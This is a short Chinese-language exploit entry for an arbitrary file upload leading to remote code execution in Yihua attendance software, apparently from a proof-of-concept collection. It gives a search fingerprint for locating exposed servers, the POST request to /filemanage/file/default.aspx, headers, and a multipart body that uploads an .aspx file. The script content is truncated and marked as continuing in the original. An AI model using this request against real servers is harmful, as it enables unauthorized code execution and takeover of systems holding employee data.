# 亿华考勤软件default.aspx存在文件上传致RCE漏洞

- **系统**：亿华考勤软件　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="url:userController.do?userOrgSelect&userId="`
- **请求**：`POST /filemanage/file/default.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary787f61f28…`　`Priority: u=0, i`　`Content-Length: 1145`

**请求体 / payload**
```
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwULLTEzNjk1NjQwNjYPZBYCAgMPZBYGAgEPDxYCHgRUZXh0BQ0vRmlsZXNVcGxvYWQvZGQCAw8PFgIeB1Zpc2libGVoZGQCBA8PFgIfAWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIQXV0b05hbWW+hnIUyETD/5rHrLALRN1Nkm8eKsAOC0ToDPaGHqsOmg==
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
5338F018
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="fileToUpload"; filename="test.aspx"
Content-Type: ima…（脚本共 1701 字，完整版见原文）
```
- **预期**：200　|　—